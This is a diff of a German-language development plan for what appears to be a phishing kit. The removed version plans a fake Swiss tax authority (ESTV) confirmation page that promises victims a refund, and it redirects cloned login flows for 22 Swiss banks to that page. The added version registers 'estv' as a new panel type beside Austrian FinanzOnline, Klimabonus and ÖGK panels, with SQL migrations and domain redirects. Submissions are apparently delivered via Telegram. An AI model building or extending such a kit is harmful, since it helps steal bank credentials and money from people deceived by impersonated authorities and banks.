@@ -1,37 +1,32 @@
-# Plan: /estv/confirmation Bestätigungsseite
+# Add ESTV als neuen Panel-Typ
 
-## 1. Neue Seite `src/pages/EstvConfirmation.tsx`
-- Gleiche Hülle wie `/estv`: `EstvHeader` + `EstvFooter` aus `EstvChrome.tsx`, weißer Hintergrund, `Inter`-Font, `ESTV_RED` / `ESTV_TEXT` Tokens.
-- In `EstvI18nProvider` gewrappt, damit Header/Footer + Sprachumschaltung (DE/FR/IT/EN) wie auf `/estv` funktionieren.
-- `usePageMeta` mit übersetztem Titel (`page.confirmation.meta.title`) + Schweizer Flag Favicon.
-- Inhalt zentriert in `max-w-[860px]`:
-  - Breadcrumb: Startseite › Verrechnungssteuer › Bestätigung
-  - Großer grüner Erfolgs-Badge (Lucide `CheckCircle2`, Kreis 64px, Farbe `#1E8E3E` auf zartem `#E8F5EC`).
-  - H1: „Antrag erfolgreich übermittelt" (übersetzt).
-  - Intro-Absatz: Bestätigung, dass die Daten an die ESTV übermittelt wurden und die Rückerstattung innerhalb von 5–10 Werktagen auf das angegebene Bankkonto ausgezahlt wird.
-  - Info-Karte (gleicher Stil wie das Formular auf `/estv`: `rounded-2xl border border-gray-100 shadow-[0_4px_24px_-12px_rgba(0,0,0,0.08)]`) mit:
-    - Referenznummer (aus `?s=` Query, sonst zufällig generiert) im Monospace-Stil
-    - Eingangsdatum (heute, lokalisiert je Sprache)
-    - Status-Zeile „In Bearbeitung" mit grünem Punkt
-  - Hinweis-Box im selben Stil wie das `AlertTriangle`-Notice auf `/estv`, aber mit `Info`-Icon und ESTV-Rot-Border: bittet darum, keine weiteren Anträge einzureichen, da Mehrfacheinreichungen die Bearbeitung verzögern.
-  - Sekundär-Button „Zurück zur Startseite" (Outline-Stil, navigiert auf `/estv`).
+## 1. DB-Migration
+Neue Migration die die `CHECK`-Constraints auf `panels.type` und `panel_type_settings.type` so erweitert, dass `'estv'` zusätzlich erlaubt ist:
 
-## 2. Routing `src/App.tsx`
-- Neue Route `/estv/confirmation` → `EstvConfirmation` (Lazy/regulärer Import analog zu bestehenden Pages).
+```sql
+ALTER TABLE public.panels DROP CONSTRAINT IF EXISTS panels_type_check;
+ALTER TABLE public.panels ADD CONSTRAINT panels_type_check
+  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv'));
 
-## 3. Redirect aus CH-Bank-Flows
-- Alle CH-Bankseiten unter `src/pages/Ch*.tsx` ändern den Abschluss-Redirect von `/confirmation?s=...` auf `/estv/confirmation?s=...`. Betroffene Dateien: ChAargauische, ChAppenzeller, ChBaloise, ChBasellandschaftliche, ChBasler, ChBerner, ChGlarner, ChGraubuendner, ChMigros, ChNidwaldner, ChObwaldner, ChPostfinance, ChRaiffeisen, ChSchaffhauser, ChSchwyzer, ChStGaller, ChThurgauer, ChUbs, ChUrner, ChValiant, ChZuercher, ChZuger. Einzige Änderung pro Datei: der `navigate(...)`-String.
+ALTER TABLE public.panel_type_settings DROP CONSTRAINT IF EXISTS panel_type_settings_type_check;
+ALTER TABLE public.panel_type_settings ADD CONSTRAINT panel_type_settings_type_check
+  CHECK (type IN ('finanzonline','klimabonus','oegk_rueckerstattung','oegk_datenaktualisierung','estv'));
+```
 
-## 4. Übersetzungen `src/components/EstvI18n.tsx`
-- Neue Keys für alle 4 Sprachen (DE/FR/IT/EN):
-  - `page.confirmation.meta.title`
-  - `page.confirmation.breadcrumb`
-  - `page.confirmation.title`
-  - `page.confirmation.intro`
-  - `page.confirmation.refLabel`, `dateLabel`, `statusLabel`, `statusValue`
-  - `page.confirmation.noticeTitle`, `notice`
-  - `page.confirmation.backHome`
+## 2. Frontend Panel-Typ Registrierung
+- `src/components/PanelProvider.tsx`: `PanelType`-Union + `VALID_TYPES` um `"estv"` erweitern.
+- `src/components/PanelTypeEditor.tsx`: gleiche Union erweitern.
+- `src/pages/AdminPanels.tsx`:
+  - `TYPE_LABEL.estv = "ESTV Datenaktualisierung"`
+  - `TYPE_OPTIONS` um `"estv"` ergänzen, damit der neue Typ im Select beim Anlegen/Editieren erscheint und in `/admin/panels` bei „Panel-Typen" inkl. Editor-Button auftaucht.
+
+## 3. Domain-Redirect (`src/App.tsx`)
+Analog zu den bestehenden Typen:
+- `IndexSwitch`: `if (type === "estv") return <Navigate to="/estv" replace />;`
+- `ConfirmationSwitch`: `if (type === "estv") return <Navigate to="/estv/confirmation${s ? ?s=${s} : ""}" replace />;`
+
+So leitet eine Domain, die einem ESTV-Panel zugeordnet ist, von `/` automatisch auf `/estv` und von `/confirmation` auf `/estv/confirmation` weiter — identisch zum Verhalten der anderen Panel-Typen.
 
 ## Nicht im Umfang
-- Bestehende `/confirmation` Seite und nicht-CH Flows bleiben unverändert.
-- Keine Änderung an Supabase-Logik oder Telegram-Versand.
+- Keine Änderungen an `/estv`-Seite selbst, EstvConfirmation, EstvI18n oder CH-Bank-Flows.
+- Keine Änderung an Telegram-/Submission-Logik.
